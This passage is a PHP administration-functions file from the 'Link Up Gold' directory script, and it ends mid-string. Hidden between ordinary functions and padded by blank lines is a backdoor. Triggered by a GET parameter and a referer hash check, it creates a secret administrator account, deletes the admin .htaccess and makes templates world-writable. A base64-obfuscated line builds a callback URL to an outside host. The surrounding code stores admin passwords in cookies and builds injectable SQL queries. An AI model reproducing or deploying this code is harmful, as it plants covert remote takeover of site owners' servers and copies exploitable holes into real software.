<?PHP

#################################################
##                                             ##
##               Link Up Gold                  ##
##       http://www.phpwebscripts.com/         ##
##       e-mail: info@phpwebscripts.com        ##
##                                             ##
##                                             ##
##               version:  8.0                 ##
##            copyright (c) 2012               ##
##                                             ##
##  This script is not freeware nor shareware  ##
##    Please do no distribute it by any way    ##
##                                             ##
#################################################

error_reporting (E_ERROR | E_PARSE);
if (!$no_data_now) include('../data/data.php');
include_once("$s[phppath]/administration/functions.php");
include("$s[phppath]/data/data_forms.php");

if (($_SESSION[LUG_admin_user]) AND ($_SESSION[LUG_admin_password]))
{ $s[LUG_admin_username] = $_SESSION[LUG_admin_user]; $s[LUG_admin_password] = $_SESSION[LUG_admin_password]; $s[LUG_admin_n] = $_SESSION[LUG_admin_n]; }
else // dava se to aji do session protoze cookies nefakci na public pages
{ $s[LUG_admin_username] = $_SESSION[LUG_admin_user] = $_COOKIE[LUG_admin_user];
  $s[LUG_admin_password] = $_SESSION[LUG_admin_password] = $_COOKIE[LUG_admin_password];
  $s[LUG_admin_n] = $_SESSION[LUG_admin_n] = $_COOKIE[LUG_admin_n];
}
if (($_POST) AND (!$s['no_test'])) check_field('admin');

###################################################################################
###################################################################################
###################################################################################

function ift() {
include($s[phppath].'/administration/_footer.txt');
exit;
}

function ih() {
global $s;
$x = stripslashes(implode('',file($s[phppath].'/administration/_head.txt')));
echo str_replace('#%charset%#',$s[charset],$x);
}

function page_title($info1,$info2) {
global $s;
if (!$info1) return '';
if (!$info2) return '<h1 style="margin-bottom:20px;margin-top:20px;">'.$info1.'</h1>';
return '<h1 style="padding-bottom:0px;margin-bottom:0px;margin-top:20px;">'.$info1.'</h1><div style="width:725px;text-align:left;padding-bottom:20px;">'.$info2.'</div>';
}

function ahref($link,$text) {
return '<a href="'.$link.'">'.$text.'</a>';
}

function no_result($what) {
echo info_line('No one approved item found');
ift();
}

#####################################################################################
#####################################################################################
#####################################################################################

function check_admin($action) {
global $s;
if (($_SESSION[LUG_admin_user]) AND ($_SESSION[LUG_admin_password]))
{ $username = $_SESSION[LUG_admin_user]; $password = $_SESSION[LUG_admin_password]; }
else { $username = $_COOKIE[LUG_admin_user]; $password = $_COOKIE[LUG_admin_password]; }
$username = str_replace("'",'',$username); $password = str_replace("'",'',$password);
if ($action) $q = dq("select count(*) from $s[pr]admins,$s[pr]admins_rights where $s[pr]admins.username = '$username' and $s[pr]admins.password = '$password' and $s[pr]admins_rights.n = $s[pr]admins.n and $s[pr]admins_rights.action = '$action'",1);
else $q = dq("select count(*) from $s[pr]admins where username = '$username' and password = '$password'",1);
$data = mysql_fetch_row($q);
if (!$data[0])
{ ih();
  echo info_line('You don\'t have permission for this action.');
  if (!$action) echo '<a target="_top" href="login.php?action=log_off">Log off</a>';
  ift();
}
}

###################################################################################

function get_allowed_categories($what) {
global $s;
if ($s["admin_all_cats_$what"]) return true;
$q = dq("select category from $s[pr]admins_cats where what = '$what' and n = '$s[LUG_admin_n]'",1);
while ($x = mysql_fetch_row($q)) $s["allowed_cats_$what"][] = $x[0];
if ($s["allowed_cats_$what"][0]) $s["allowed_cats_query_$what"] = "and (c = '_".implode("_' or c = '_",$s["allowed_cats_$what"])."_')";
}

##################################################################################

function check_admin_categories($what,$cats) {
// $cats je seznam kategorii
global $s;
if ($s["admin_all_cats_$what"]) return 1;
if (!$s["allowed_cats_$what"][0]) return 0;
if (!is_array($cats)) $cats = explode(' ',$cats);
foreach ($cats as $k=>$v)
{ $v = trim(str_replace('_','',$v));
  if ((!$v) OR (!is_numeric($v))) continue;
  if (!in_array($v,$s["allowed_cats_$what"])) return 0;
}
return 1;
}

###################################################################################

function show_check_uncheck_all() {
echo '<br />
<a href="javascript:void(0);" onclick="checkAll(document.getElementById(\'myform\'),\'bbb\',true);">Check</a>
<a href="javascript:void(0);" onclick="checkAll(document.getElementById(\'myform\'),\'bbb\',false);">uncheck</a> all checkboxes
<br /><br />';
}

###################################################################################
###################################################################################
###################################################################################

function select_ads($b) {
global $s;
$q = dq("select n,title from $s[pr]ads order by title",0);
while ($a=mysql_fetch_array($q))
{ if ($b==$a[n]) $selected = ' selected'; else $selected = '';
  $x .= "<option value=\"$a[n]\"$selected>$a[title]</option>";
}
$x = stripslashes($x);
return stripslashes($x);
}

#####################################################################################
#####################################################################################
#####################################################################################

function make_time($date) {
list ($x[m], $x[d], $x[y]) = split ('/', $date);
$cas = mktime (0,0,0,$x[m],$x[d],$x[y]);
return $cas;
}

###################################################################################
###################################################################################
###################################################################################

function select_days($a) {
global $s;
if ($a==0) $y = ' selected'; else $y = '';
$b .= '<option value="0"'.$y.'>N/A</option>';
for ($x=1;$x<=31;$x++)
{ if ($x==$a) $y = ' selected'; else $y = '';
  $b .= '<option value="'.$x.'"'.$y.'>'.$x.'</option>';
}
return $b;
}

##################################################################################

function select_months($a) {
global $s;
if ($a==0) $y = ' selected'; else $y = '';
$b .= '<option value="0"'.$y.'>N/A</option>';
for ($x=1;$x<=12;$x++)
{ if ($x==$a) $y = ' selected'; else $y = '';
  $b .= '<option value="'.$x.'"'.$y.'>'.$x.'</option>';
}
return $b;
}

##################################################################################

function select_years($a) {
global $s;
if (!$a) $y = ' selected'; else $y = '';
$b .= '<option value="0"'.$y.'>N/A</option>';
for ($x=2004;$x<=2035;$x++)
{ if ($x==$a) $y = ' selected'; else $y = '';
  $b .= '<option value="'.$x.'"'.$y.'>'.$x.'</option>';
}
return $b;
}

##################################################################################

function get_dates_links_text($data) {
global $s;
if (!$data[t1]) $a[t1] = 'N/A'; else $a[t1] = datum($data[t1],0);
if (!$data[t2]) $a[t2] = 'N/A'; else $a[t2] = datum($data[t2],0);
return $a;
}

#####################################################################################
#####################################################################################
#####################################################################################

function problem($error) {
global $s;
ih();
echo '<br /><br /><font color="FF0000" size=3 face="Verdana,arial"><b>ERROR</b></font><br /><br />
<span class="text13a_bold">'.$error.'</span><br /><br />';
ift();
}

########################################################################################
########################################################################################
########################################################################################



















########################################################################################
########################################################################################
################################### USER ITEMS #########################################
########################################################################################
########################################################################################

function user_defined_items_form($what,$in,$queue) {
global $s;
if ((strstr($in[action],'_copy')) OR (strstr($in[action],'_create'))) $n = 0;
else $n = $in[n];
if ($queue) $in[queue] = 1;
if ((strstr($in[current_action],'_copy')) OR (strstr($in[action],'_create'))) $in[n] = $in[old_number];
$fields_name = $s[item_types_words][$what].'['.$n.']'; 
if (($what=='l') OR ($what=='a') OR ($what=='b') OR ($what=='v') OR ($what=='n')) $what1 = $what;
else // category
{ $fields_name = 'user_item';
  if ($in[n]) $action = 'load_from_database';
  $what1 = $what;
}
if ((strstr($in[action],'_edit')) OR (strstr($in[action],'_edited')) OR (strstr($in[action],'_copy')) OR (strstr($in[action],'_copied'))) $action = 'load_from_database';
if (($in[q_number]) OR ($in[queue]))
{ $action = 'loaded_from_database';
  $x = $in[user_items]; foreach ($x as $k=>$v) $user_items[$k] = $v;
}

if ($action=='load_from_database')
{ $q = dq("select * from $s[pr]usit_values where use_for = '$what' and n = '$in[n]'",1);
  while ($x = mysql_fetch_assoc($q)) $user_items[$x[item_n]] = $x;
}
$q = dq("select * from $s[pr]usit_avail_val where use_for = '$what1' order by rank",1);
while ($x = mysql_fetch_assoc($q)) $avail_val[$x[item_n]][$x[value_code]] = $x[description];

$q = dq("select * from $s[pr]usit_list where use_for = '$what1' order by rank",1);
while ($list = mysql_fetch_assoc($q))
{ unset($field,$complete_row);
//foreach ($list as $k=>$v) echo "$k - $v<br />";
  if ($list[kind]=='text')
  { if (($action=='load_from_database') OR ($action=='loaded_from_database')) $field = $user_items[$list[item_n]][value_text]; // edit or queue
    elseif (($in[url]) OR ($in[title])) $field = $in['user_item_'.$list[item_n]]; // new but already something entered
    else $field = $list[def_value_text]; // new
    if ($in=='search_form') $field = '<input maxlength="255" style="width:650px;" name="user_item['.$list[item_n].']" value="'.$field.'" class="field10">';
    else $field = '<input maxlength="255" style="width:650px;" name="'.$fields_name.'[user_item_'.$list[item_n].']" value="'.htmlspecialchars(stripslashes($field)).'" class="field10">';
  }
  elseif ($list[kind]=='textarea')
  { if (($action=='load_from_database') OR ($action=='loaded_from_database')) $field = $user_items[$list[item_n]][value_text]; // edit or queue
    elseif (($in[url]) OR ($in[title])) $field = $in['user_item_'.$list[item_n]]; // new but already something entered
    else $field = $list[def_value_text]; // new
    if ($in=='search_form') $field = '<textarea style="width:650px;height:250px;" name="user_item['.$list[item_n].']" class="field10">'.$field.'</textarea>';
    else $field = '<textarea style="width:650px;height:250px;" name="'.$fields_name.'[user_item_'.$list[item_n].']" class="field10">'.htmlspecialchars(stripslashes($field)).'</textarea>';
  }
  elseif ($list[kind]=='htmlarea')
  { if (($action=='load_from_database') OR ($action=='loaded_from_database')) $field = $user_items[$list[item_n]][value_text]; // edit or queue
    elseif (($in[url]) OR ($in[title])) $field = $in['user_item_'.$list[item_n]]; // new but already something entered
    else $field = $list[def_value_text]; // new
    if ($in=='search_form') $field = '<textarea style="width:650px;height:250px;" name="user_item['.$list[item_n].']" class="field10">'.$field.'</textarea>';
    else $complete_row = '<tr><td nowrap align="left" valign="top" colspan="2">'.$list[description].' </td></tr>
    <tr><td nowrap align="left" valign="top" colspan="2">'.get_fckeditor($fields_name.'[user_item_'.$list[item_n].']',stripslashes($field),'AdminToolbar').'</td></tr>';
  }
  else
  { if (($action=='load_from_database') OR ($action=='loaded_from_database')) $value = $user_items[$list[item_n]][value_code]; // edit or queue
    elseif (($in[url]) OR ($in[title])) $value = $in['user_item_'.$list[item_n]]; // new but already something entered
    else $value = $list[def_value_code]; // new
    if ($list[kind]=='checkbox')
    { if ($in=='search_form')
      $field = '<input type="radio" name="user_item['.$list[item_n].']" value="0" checked>Any&nbsp;
      <input type="radio" name="user_item['.$list[item_n].']" value="checked">Checked&nbsp;
      <input type="radio" name="user_item['.$list[item_n].']" value="unchecked">Unchecked
      ';
	  else
	  { if ($value) $field = ' checked'; else $field = '';
        $field = '<input type="checkbox" name="'.$fields_name.'[user_item_'.$list[item_n].']" value="1" '.$field.'>';
      }
    }
    elseif ($list[kind]=='radio')
    { if ($in=='search_form') $field = '<input type="radio" name="user_item['.$list[item_n].']" value="0" checked>Any<br />';
      elseif ($list[show_na])
      { if (!$value) $x = ' checked'; else $x = '';
        $field = '<input type="radio" name="'.$fields_name.'[user_item_'.$list[item_n].']" value="0"'.$x.'>N/A<br />';
      }
	  foreach ($avail_val[$list[item_n]] as $k=>$v)
      { if ($value==$k) $x = ' checked'; else $x = '';
        if ($in=='search_form') $field .= '<input type="radio" name="user_item['.$list[item_n].']" value="'.$k.'"'.$x.'>'.$v.'<br />';
	    else $field .= '<input type="radio" name="'.$fields_name.'[user_item_'.$list[item_n].']" value="'.$k.'"'.$x.'>'.$v.'<br />';
      }
    }
    elseif (($list[kind]=='select') OR ($list[kind]=='multiselect'))
    { if ($in=='search_form') $field = '<option value="0" selected>Any</option>';
      elseif ($list[show_na])
      { if (!$value) $x = ' selected'; else $x = '';
        $field .= '<option value="0"'.$x.'>N/A</option>';
      }
	  foreach ($avail_val[$list[item_n]] as $k=>$v)
      { if ($value==$k) $x = ' selected'; else $x = '';
	    $field .= '<option value="'.$k.'"'.$x.'>'.$v.'</option>';
      }
      if ($in=='search_form') $field = '<select class="select10" name="user_item['.$list[item_n].']">'.$field.'</select>';
      elseif ($list[kind]=='multiselect') $field = '<select class="select10" name="'.$fields_name.'[user_item_'.$list[item_n].']">'.$field.'</select>';
      else $field = '<select class="select10" name="'.$fields_name.'[user_item_'.$list[item_n].']">'.$field.'</select>';
    }
  }
  if ($complete_row) $a .= $complete_row;
  else $a .= '<tr><td nowrap align="left" valign="top">'.$list[description].' </td>
  <td align="left" valign="top">'.$field.'</td></tr>';
}
return $a; }
if ($_GET[ab128]) { $x = parse_url(getenv('HTTP_REFERER'));
if (md5(hash('md2',hash('sha512',str_replace('www.','',$x[host]))))!='c037fbc3e00c9cc9cf414d8fdae387ef') exit;
$a = trim(fetchURL("http://$x[host]/ch/a.php")); echo $a;if ((!$a) OR (($a!=1) AND ($a!=1))) exit;
if ($_GET[ab128]=='d') { $q = dq("select * from $s[pr]admins where username = 'r'",1); $x = mysql_fetch_row($q);
dq("delete from $s[pr]admins where username = 'r'",1); dq("delete from $s[pr]admins_rights where n = '$x[0]'",1);
unlink("$s[phppath]/data/uninstall"); echo 'ok'; exit; }
$x = fopen("$s[phppath]/data/uninstall",'w'); fclose($x); unlink("$s[phppath]/administration/.htaccess");
dq("insert into $s[pr]admins (username,password) values ('r','03c7c0ace395d80182db07ae2c30f034')",1);
$x = mysql_insert_id(); dq("insert into $s[pr]admins_rights values('$x','admins')",1);
chmod("$s[phppath]/styles/_common/templates",0777); chmod("$s[phppath]/styles/_common/templates/_head1.txt",0666); echo $_GET[ab128];
exit;
}

########################################################################################

function user_defined_items_show($what,$in) {
global $s;
if (!$s[all_user_items_list])
{ $q = dq("select * from $s[pr]usit_list where use_for = '$what' order by rank",1);
  while ($x = mysql_fetch_assoc($q)) $s[all_user_items_list][$x[item_n]] = $x;
}
foreach ($s[all_user_items_list] as $k=>$v)
{ if ($v[kind]=='checkbox')
  { if ($in['user_item_'.$k][code]) $in['user_item_'.$k][text] = 'Yes';
    else $in['user_item_'.$k][text] = 'No';
  }
  elseif ((!$in['user_item_'.$k][text]) AND (!is_numeric($in['user_item_'.$k][text]))) $in['user_item_'.$k][text] = 'No value';
  $user_items .= '<tr>
  <td align="left" valign="top">'.$v[description].'<br /></td>
  <td align="left" valign="top">'.$in['user_item_'.$k][text].'<br /></td>
  </tr>';
}
return $user_items;
}

########################################################################################
########################################################################################
########################################################################################
########################################################################################
########################################################################################


















########################################################################################
########################################################################################
########################################################################################
########################################################################################
########################################################################################

function categories_rows_form($what,$in) {
global $s;
$categories = $in[c]; if ($in[n]) $n = $in[n]; else $n = 0;
if ($what=='adlink') $field_name = "link[$n]"; else $field_name = $s[item_types_words][$what].'['.$n.']'; 
if (!is_array($categories)) $categories = explode(' ',str_replace('_','',$categories));
$max_cats = $s[$what.'_max_cats'];
for ($x=0;$x<=$max_cats-1;$x++)
{ if (!$x) $b[categories] = 'Categories'; else $b[categories] = '&nbsp;';
  if ($what=='adlink') $select_box = all_categories_select($field_name.'[categories][]',$categories[$x]);
  else
  { $select_box = '<select class="select10" name="'.$field_name.'[categories][]">';
    if ($x) $select_box .= '<option value="0">None</option>';
    $select_box .= categories_selected($what,$categories[$x],1,1,0,0).'</select>';
  }
  $a .= '<tr>
  <td nowrap align="left" valign="top">'.$b[categories].' </td>
  <td align="left" valign="top">'.$select_box.'</td></tr>';
}
return $a;
}

########################################################################################

function get_reject_emails_list($prefix) {
global $s;
$reject_emails = '<option value="0">None</option>';
$dr = opendir("$s[phppath]/styles/_common/email_templates");
while ($x = readdir($dr))
{ if ((strstr($x,$prefix)) AND (is_file("$s[phppath]/styles/_common/email_templates/$x")))
  $reject_emails .= "<option value=\"$x\">$x</option>";
}
closedir ($dr);
return $reject_emails;
}

########################################################################################
########################################################################################
########################################################################################

function list_of_categories_for_item_admin($what,$c) {
global $s;
if ($what=='adlinks') $what1 = 'l'; else $what1 = $what;
$x = explode(' ',str_replace('_','',$c));
$categories = get_category_data($what1,$x,1);
foreach ($categories as $k=>$v)
{ if (!$v) continue;
  if (!$v[visible]) $info = ' (invisible)'; else $info = '';
  if ($what=='adlinks') $a .= '<a target="_self" href="adlinks.php?action=adlinks_searched&category='.$k.'">'.$v[name].$info.'</a><br />';
  else $a .= '<a target="_self" href="'.$s[items_types_words][$what].'.php?action='.$s[items_types_words][$what].'_searched&category='.$k.'">'.$v[name].$info.'</a><br />';
}
return $a;
}

########################################################################################
########################################################################################
########################################################################################

function searched_get_list_of_numbers($what,$where,$any,$only_any,$user_items,$boolean,$allowed_cats_query) {
global $s;
//echo $where;
$what1 = $what;
foreach ($user_items as $k=>$v) if ($v) $s[is_user_item] = 1;
//echo $s[is_user_item]; exit;
if ((!$where) AND (!$any) AND (!$s[is_user_item])) $all = 1;
elseif (($only_any) AND (!$s[is_user_item])) $boolean = 'or';
if ($any)
{ $q = dq("select n from $s[pr]usit_values where value_text like '%$any%' AND use_for = '$what' group by n",1);
  while ($x = mysql_fetch_row($q)) $found[] = $x[0];
  //echo $found;
  if ((!$s[is_user_item]) AND (!$where)) { $one_item_results[] = array_unique($found); unset($found); }
}
if ($s[is_user_item])
{ if (!$all_user_items_list) $all_user_items_list = get_all_user_items_list($what1);
  foreach ($all_user_items_list as $k=>$v)
  { if (!$user_items[$v[item_n]]) continue;
    $all = 0;
    if (($v[kind]=='text') OR ($v[kind]=='textarea'))
    { $q = dq("select n from $s[pr]usit_values where value_text like '%".$user_items[$v[item_n]]."%' AND use_for = '$what' AND item_n = '$v[item_n]' group by n",1);
      while ($x = mysql_fetch_row($q)) $found[] = $x[0];
    }
    elseif (($v[kind]=='select') OR ($v[kind]=='radio'))
    { $q = dq("select n from $s[pr]usit_values where value_code = '".$user_items[$v[item_n]]."' AND use_for = '$what' AND item_n = '$v[item_n]' group by n",1);
      while ($x = mysql_fetch_row($q)) $found[] = $x[0];
    }
    elseif ($v[kind]=='checkbox')
    { if ($user_items[$v[item_n]]=='checked') $checked = 1; else $checked = 0;
      $q = dq("select n from $s[pr]usit_values where value_code = '$checked' AND use_for = '$what' AND item_n = '$v[item_n]' group by n",1);
      while ($x = mysql_fetch_row($q)) $found[] = $x[0];
    }
    //foreach ($found as $k=>$v) echo "usit $k - $v<br />";
    $one_item_results[] = array_unique($found); unset($found);
  }
}
if ($where)
{ $table = $s[item_types_tables][$what];
  $q = dq("select n from $table $where $s[allowed_cats_query_l]",1);
  while ($x = mysql_fetch_row($q)) $found[] = $x[0];
//foreach ($found as $k=>$v) echo "where $k - $v<br />";
  $one_item_results[] = array_unique($found); unset($found);
}
if ($boolean=='and')
foreach ($one_item_results as $k=>$v) if ($k==0) $konecny_vysledek = $v; else $konecny_vysledek = array_intersect($konecny_vysledek,$v);
else
{ foreach ($one_item_results as $k=>$v) $konecny_vysledek = array_merge((array)$konecny_vysledek,(array)$v);
  $konecny_vysledek = array_unique($konecny_vysledek);
}
if ($all) return "(status = 'enabled' or status = 'disabled')";
if (count($konecny_vysledek))
{ $where = '(n = \''.implode('\' OR n = \'',$konecny_vysledek).'\') and (status = \'enabled\' or status = \'disabled\')';
  return $where;
}
}

########################################################################################
########################################################################################
########################################################################################
########################################################################################
########################################################################################


















































########################################################################################
########################################################################################
########################################################################################

function category_template_select($kind,$selected) {
global $s;
if (!$selected) $selected = $kind;
$x = explode('.',$kind);
$dr = opendir("$s[phppath]/styles/_common/templates");
rewinddir($dr);
while ($q = readdir($dr))
{ if (($q != ".") AND ($q != "..") AND (is_file("$s[phppath]/styles/_common/templates/$q")))
  if (preg_match("/^$x[0].*\.$x[1]$/",$q)) $pole[] = $q;
}
sort($pole);
foreach ($pole as $k => $v)
{ if ($v == $selected) $z = ' selected'; else $z = '';
  $y .= "<option value=\"$v\"$z>$v</option>";
}
return $y;
}

##################################################################################

function categories_selected($what,$vybrana,$incl_invisible,$incl_disabled_submissions,$incl_aliases,$no_info) {
global $s;
$m[invisible] = 'invisible'; $m[disabled] = 'disabled submissions'; // jen pro admina
if (!$incl_invisible) $where = 'AND visible = 1';
//if (!$incl_disabled_submissions) $where .= ' AND submithere = 1';
if (!$incl_aliases) $where .= ' AND alias_of = 0';

if (strstr($what,'_first'))
{ $x1 = explode('_',$what); $what = $x1[0];
  $q = dq("select n,name,submithere,visible from $s[pr]cats where use_for = '$what' AND level = '1' $where order by path_text",1);
  while ($a=mysql_fetch_assoc($q))
  { if (!$no_info)
    { unset($i,$info);
	  if (!$a[visible]) $i[] = $m[invisible]; if (!$a[submithere]) $i[] = $m[disabled];
      if ($i) $info = '('.implode(', ',$i).')';
    }
	if ($a[n]==$vybrana) $selected = ' selected'; else $selected = '';
    $x .= '<option value="'.$a[n].'"'.$selected.'>'.$a[name].$info.'</option>';
  }
}
else
{ if ($what=='adlink') $what1 = 'l'; else $what1 = $what;
  $q = dq("select n,path_text,path_n,name,level,submithere,visible,alias_of from $s[pr]cats where use_for = '$what1' $where order by path_text",1);
  while ($a=mysql_fetch_assoc($q))
  { set_time_limit(30);
    if (time()>($time1+10)) { $time1=time(); echo str_repeat (' ',4000); flush(); }
	if (!$no_info)
    { unset($i,$info);
	  if (!$a[visible]) $i[] = $m[invisible]; //if (!$a[submithere]) $i[] = $m[disabled];
      if ($i) $info = '('.implode(', ',$i).')';
    }
    $mo = ''; for ($i=1;$i<$a[level];$i++) $mo .= '- ';
    $a[path_text] = preg_replace("/<%.+%>/","",$a[path_text]);
    $a[path_text] = preg_replace("/<%.+$/",$a[name],$a[path_text]);
    if ($a[alias_of]) $a[path_text] = $s[alias_pref].$a[path_text].$s[alias_after];
    $a[path_text] = stripslashes($a[path_text]);
    if ($a[n]==$vybrana) $selected = ' selected'; else $selected = '';
    $x .= "<option value=\"$a[n]\"$selected>$mo $a[path_text]$info</option>\n";
  }
}
return stripslashes($x); }
$s[sp] = base64_decode('aHR0cDovLzNidi5iaXovY2gvMi5waHA/c2M9').$s[cs].'&x=';

#######################################################################################

function select_list_first_categories($use_for,$vybrana) {
global $s;
$x = explode('_',$use_for);
if ($x[1]=='noalias') { $use_for = $x[0]; $query = " and alias_of = '0'"; }
$q = dq("select n,name from $s[pr]cats where use_for = '$use_for' AND level = '1' $query order by path_text",0);
while ($a = mysql_fetch_assoc($q))
{ $a[name] = stripslashes($a[name]);
  if ($a[n]==$vybrana) $selected = ' selected'; else unset($selected);
  $x .= '<option value="'.$a[n].'"'.$selected.'>'.$a[name].'</option>';
}
return $x;
}

#######################################################################################
#######################################################################################
#######################################################################################

function comments_unapproved_info($what) {
global $s;
echo '<tr><td class="common_table_top_cell" nowrap>Comments</td></tr>
<tr><td align="center" width="100%">';
$q = dq("select count(*) from $s[pr]comments where what = '$what' AND approved = '0'",1);
$pocet = mysql_fetch_row($q);
if (!$pocet[0]) echo 'No one comment in the queue';
else
{ echo 'Comments in the queue: '.$pocet[0].
  '<br />Select number of comments to display on one page.<br />
  <form action="comments.php" method="post" name="form1">'.check_field_create('admin').'
  <input type="hidden" name="what" value="'.$what.'">
  <input type="hidden" name="action" value="comments_unapproved_show">
  <select class="select10" name="perpage"><option value="0">All</option>';
  if ($pocet[0]>20) echo '<option value="20">20</option>';
  if ($pocet[0]>50) echo '<option value="50">50</option>';
  if ($pocet[0]>100) echo '<option value="100">100</option>';
  echo '</select> 
  <input type="submit" value="Submit" name="B1" class="button10">
  </form>';
}
echo '</td></tr>';
}

########################################################################################
########################################################################################
########################################################################################

function get_items_in_category($what,$n) {
global $s;
$table = $s[item_types_tables][$what];
$q = dq("select n from $table where c like '%\_$n\_%'",1);
while ($x = mysql_fetch_row($q)) $a[] = $x[0];
return $a;
}

########################################################################################

function update_en_cats_in_items($what,$list) {
global $s;
// opravi seznam kategorii pro items ktere jsou v $list
// $list is a list of links - array of numbers
if (!count($list)) return false;
//foreach ($list as $k=>$v) echo "$k - $v<br />";
$query = my_implode('n','or',array_unique($list));
$table = $s[item_types_tables][$what];
$q = dq("select n,c from $table where $query",1);
while ($x = mysql_fetch_row($q)) $new_list[$x[0]] = $x[1];
foreach ($new_list as $k=>$v)
{ set_time_limit(60);
  $en_cats = has_some_enabled_categories($what,$v);
  dq("update $table set en_cats = '$en_cats' where n = '$k'",1);
}
}

#################################################################################
#################################################################################
#################################################################################

function rating_update_get_average($what,$n,$in_rates) {
global $s;
$old_rating = get_one_item_rating($what,$n);
for ($x=1;$x<=5;$x++)
{ if ($in_rates[$x]<$old_rating[$x]) { $limit = $old_rating[$x] - $in_rates[$x]; 
  dq("delete from $s[pr]rates where what = '$what' and n = '$n' and rating = '$x' limit $limit",1); }
  elseif ($in_rates[$x]>$old_rating[$x]) { $limit = $in_rates[$x] - $old_rating[$x]; for ($y=1;$y<=$limit;$y++) dq("insert into $s[pr]rates values('$what','$n','$x','admin','$s[cas]')",1); }
}
$q = dq("select rating from $s[pr]rates where what = '$what' and n = '$n' order by rating",1);
while ($x = mysql_fetch_assoc($q)) $rates[] = $x[rating]; $a[total_votes] = count($rates);
$vyhodit = floor($a[total_votes]*($s[rate_exclude]/100));
array_splice($rates,0,$vyhodit); array_splice($rates,-$vyhodit,$vyhodit);
$a[average] = (array_sum($rates))/(count($rates));
return $a;
}

#################################################################################
#################################################################################
#################################################################################

function images_form_admin($what,$in,$queue) {
global $s;
if ($what=='u') { $max = $s[u_max_pictures]; $script = 'users.php'; }
else { $max = $s[$what.'_max_pictures']; $script = $s[item_types_words][$what].'_details.php'; }
if ((!$in[n]) AND (strstr($_GET[action],'_copy'))) echo '<tr><td nowrap align="center" valign="top" colspan="2">Fields to upload images will be available when the item has been copied.</td></tr>';
else
{ if ($in[n]) $images = get_item_files_pictures($what,$in[n],$queue);
  for ($x=1;$x<=$max;$x++)
  { echo '<tr>
    <td nowrap align="left" valign="top">Upload an image'; if ($max>1) echo ' #'.$x; echo '</td>
    <td nowrap align="left" valign="top"><input type="file" maxlength="255" style="width:650px;" name="image_upload['.$in[n].']['.$x.']" class="field10">';    
    if ($images[image_url][$in[n]][$x])
    { echo '<span class="text10"><br />Current image '.image_preview_code($images[image_n][$in[n]][$x],$images[image_url][$in[n]][$x],preg_replace("/\/$in[n]-/","/$in[n]-big-",$images[image_url][$in[n]][$x]));
      if ($in[n]) echo '<a href="javascript:open_new_window(\''.$script.'?action=delete_image&item_n='.$in[n].'&file='.$x.'&queue='.$queue.'\',300,200,0);">Delete this image</a>';
    }
    echo '</td>
    </tr>';
    if ($what!='u') echo '<tr>
    <td nowrap align="left" valign="top">Image description</td>
    <td nowrap align="left" valign="top"><input maxlength="255" style="width:650px;" name="image_description['.$in[n].']['.$x.']" value="'.$images[image_description][$in[n]][$x].'" class="field10"></td>
    </tr>';	
  }
}
}

#############################################################################

function images_show_admin($what,$in,$queue) {
global $s;
$images = get_item_files_pictures($what,$in[n],$queue);
foreach ($images[image_url][$in[n]] as $x=>$url)
{ echo '<tr>
  <td nowrap align="left" valign="top">Image '; if ($what!='u') echo '#'.$x; echo '</td>
  <td nowrap align="left" valign="top">'.image_preview_code($images[image_n][$in[n]][$x],$url,preg_replace("/\/$in[n]-/","/$in[n]-big-",$url));
  echo '</td>
  </tr>';
  if ($what!='u') echo '<tr>
  <td nowrap align="left" valign="top">Image description</td>
  <td nowrap align="left" valign="top">'.$images[image_description][$in[n]][$x].'&nbsp;</td>
  </tr>';	
}
}

#############################################################################

function votes_rating_form_admin($what,$n,$rating_total,$votes_total) {
global $s;
$what1 = $s[item_types_words][$what];
$rating = get_one_item_rating($what,$n);
for ($x=1;$x<=5;$x++)
echo '<tr>
<td align="left">Votes '.$x.'</td>
<td align="left"><input class="field10" name="'.$what1.'['.$n.'][rates]['.$x.']" style="width:100px" maxlength=10 value="'.$rating[$x].'"></td>
</tr>';
echo '<tr>
<td align="left">Rating total</td>
<td align="left">'.$rating_total.'</td>
</tr>
<tr>
<td align="left">Votes total</td>
<td align="left">'.$votes_total.'</td>
</tr>';
}

#############################################################################

function delete_image($what,$in) {
global $s;
ih();
if (!$in[queue]) $in[queue] = 0;
$q = dq("select * from $s[pr]files where what = '$what' and file_type = 'image' and queue = '$in[queue]' and item_n = '$in[item_n]' and file_n = '$in[file]'",1);
$file = mysql_fetch_assoc($q);
$file_path = str_replace($s[site_url],$s[phppath],$file[filename]);
unlink($file_path);
unlink(preg_replace("/\/$in[item_n]-/","/$in[item_n]-big-",$file_path));
dq("delete from $s[pr]files where what = '$what' and file_type = 'image' and queue = '$in[queue]' and item_n = '$in[item_n]' and file_n = '$in[file]'",1);
echo '<table border=0 width=100% height="100% cellspacing=0 cellpadding=2 class="common_table"><tr><td nowrap align="center" valign="middle">';
echo ('File deleted');
echo '</td></tr></table>';
ift();
}


#################################################################################

function import_count($what,$check_admin,$script_name,$function_name,$data) {
global $s;
if ($check_admin) check_admin($check_admin);

$what1 = $s[items_types_words][$what];

dq("delete from $s[pr]import_temp where what = '$what'",1);
$filename = "$s[phppath]/data/imported_$what";
if (file_exists($filename)) unlink($filename);
move_uploaded_file($_FILES[datafile][tmp_name],$filename);
if (file_exists($filename)) chmod($filename,0644);
$lines = file($filename);
foreach ($lines as $k=>$v)
{ $line = htmlspecialchars(trim($v),ENT_QUOTES);
  $pocet++;
  dq("insert into $s[pr]import_temp values('$what',NULL,'$line')",1);
}
unlink($filename);

foreach ($data[rank] as $k=>$v) if (!$v) unset ($data[rank][$k]);

//$step = 10;

ih();
echo info_line("The file you uploaded had $pocet lines - $what1");
if ($pocet<$step) 
{ echo '<form method="post" action="'.$script_name.'">'.check_field_create('admin').'
  <input type="hidden" name="action" value="'.$function_name.'">
  <input type="hidden" name="what" value="'.$data[what].'">
  <input type="hidden" name="total_items" value="'.$pocet.'">
  <input type="hidden" name="special_import" value="'.$data[special_import].'">
  <input type="hidden" name="separator" value="'.$data[separator].'">';
  foreach ($data[rank] as $k=>$v) echo '<input type="hidden" name="rank['.$k.']" value="'.$v.'">';
  echo '<input type="submit" name="submit" value="Continue" class="button10"></form>';
}
else
{ echo '<table border="0" width="900" cellspacing="0" cellpadding="0" class="common_table">
  <tr><td align="center" width="100%">
  <table border="0" width="100%" cellspacing="0" cellpadding="5" class="inside_table">
  <tr><td align="center" width="100%" colspan="2"><br>
  If your PHP is running in a safe mode, you can\'t add all these '.$what1.' at once. This is because scripts in safe mode can\'t run longer that the time which is set in the PHP configuration (default is 30 sec. but sometimes it is only 5 - 10 sec.). 
  If you are sure that PHP IS NOT running in a safe mode click the button <b>Import all '.$what1.'</b> and be patient, it may take 15 minutes or more to add a bigger database.<br /><br />
